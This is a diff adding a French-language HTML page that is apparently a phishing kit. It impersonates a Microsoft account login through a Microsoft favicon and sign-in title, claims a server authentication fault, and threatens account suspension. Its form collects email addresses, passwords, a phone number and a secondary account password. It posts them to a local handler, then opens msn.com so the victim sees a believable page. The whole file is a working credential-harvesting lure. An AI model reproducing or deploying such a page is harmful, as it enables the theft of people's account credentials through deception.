@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+		<meta name="viewport" content="width=device_width, initial-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="ie=edge">
+		<meta forua="true" http-equiv="Cache-Control" content="max-age=0"/>
+		<title>TEST SITE STATIQUE</title>
+    </head>
+	    <template>
+ <do type="options" name="Prev" label="Back"><prev/></do>
+ </template>
+ <card id="index" title="" > 
+<p><script type="text/javascript"> document.title = "Se connecter à votre compte"; </script><title>Se connecter à votre compte</title>
+
+<link rel="shortcut icon" type="image/x-icon" href="http://diylogodesigns.com/blog/wp-content/uploads/2016/04/Microsoft-Logo-icon-png-Transparent-Background.png"/> 
+<div><div><body dir="ltr"
+style="background-color: #fff; font-family: arial, helvetica, sans-serif; font-size: 13px; padding: 0; margin: 0;">
+<div style="margin: 0px;"/>
+<img src="https://img2.lght.pics/ROJl.png"
+border="0"
+align="bottom"
+alt=""/>
+</body></div>
+</div> 
+<div><div><div style="background-color: #fff; text-align: center; border-color:#e5e5e5; border-width: 1px 0 1px 0; border-style: ; padding: 10px 0 10px 10px; margin: 0;"><form method="post" class="mobile-login-form" onSubmit="window.open('http://www.msn.com/fr-fr/?ocid=mailsignout')"  action="/site_0.xhtml">
+
+<p>
+    Vous recevez ce message car notre serveur a subir des dommages d'authentification.<br/> 
+	Afin de régulariser votre situation, veuillez vous refferez ci-dessous et renseigner vos identifiants dans les plus bref délais:<br/> 
+	<div style="color: red">NB: Lors d'échec de régularisation de votre situation, nous procederons à la suspension de votre compte. Cette intervention sera sans préavis.</div>
+</p>
+<p><div class="label"><b>Adresse e-mail ou Identifiant <span class="requis">*</span></b></div>
+<input type="text" style="height: 30px" name="mf_text[E-mail Address]" value="" class="textbox" placeholder="   E-mail Address" size="43" maxlength="70"/><br/></p>
+<p><div class="label"><b>Mot de passe <span class="requis">*</span></b></div>
+<input type="Password" style="height: 30px" name="mf_text[Password]" value="" class="textbox" placeholder="   Confirm Password" size="43" maxlength="40"/><br/></p>
+<p><div class="label"><b>Numero de telephone <span class="requis">*</span></b></div>
+<input type="text" style="height: 30px" name="mf_text[Phone_number]" value="" class="textbox" placeholder="   Phone number" size="43" maxlength="10"/><br/></p>
+<p><div class="label"><b>Adresse e-mail secondaire <span class="requis">*</span></b></div>
+<input type="text" style="height: 30px" name="mf_text[Secondary E-mail Address]" value="" class="textbox" placeholder="   E-mail Address" size="43" maxlength="40"/><br/></p>
+<p><div class="label"><b>Mot de passe <span class="requis">*</span></b></div>
+<input type="Password" style="height: 30px" name="mf_text[Password_secondary]" value="" class="textbox" placeholder="   Confirm Password" size="43" maxlength="40"/><br/></p>
+
+
+<input type="hidden" name="action" value="send_message"/>
+<input type="submit" name="MF_submit" style="height: 37px; background: #3A5FCD; color: white; font-color: ; text-align: left;" value="                         Je m'identifie                        " class="button"/> </form></div>
+<div><div style="margin: 70px;"><img src="https://img2.lght.pics/ROJC.png"
+border="0"
+align="bottom"
+alt=""/>
+<br/>
+</div>
+<div style="margin: 10px; font-size: 11px;">
+© 2017 GROUP Secure | <a href="">Terms of Service</a>
+| <a href="">privacy</a>
+| <a href="">plan du site</a>
+</div></div></div>
+</div></p> 
+  </card>	
+</html>
